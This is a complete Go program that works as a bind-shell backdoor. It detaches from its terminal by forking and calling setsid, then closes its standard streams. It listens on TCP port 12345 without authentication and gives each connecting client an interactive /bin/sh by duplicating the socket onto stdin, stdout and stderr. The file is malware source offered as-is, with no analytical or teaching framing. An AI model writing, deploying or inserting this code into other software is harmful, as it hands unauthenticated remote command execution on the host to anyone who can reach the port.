package main

import (
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {

	pid, _, _ := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
	if pid != 0 {
		os.Exit(0)
	}

	syscall.Setsid()
	syscall.Close(0)
	syscall.Close(1)
	syscall.Close(2)

	listener, err := net.Listen("tcp", ":12345")
	if err != nil {
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		pid, _, _ := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
		if pid == 0 {
			handleConnection(conn)
		}
		conn.Close()
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		return
	}
	connFile, err := tcpConn.File()
	if err != nil {
		return
	}
	defer connFile.Close()

	syscall.Dup2(int(connFile.Fd()), int(os.Stdin.Fd()))
	syscall.Dup2(int(connFile.Fd()), int(os.Stdout.Fd()))
	syscall.Dup2(int(connFile.Fd()), int(os.Stderr.Fd()))

	cmd := exec.Command("/bin/sh")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	os.Exit(0)
}
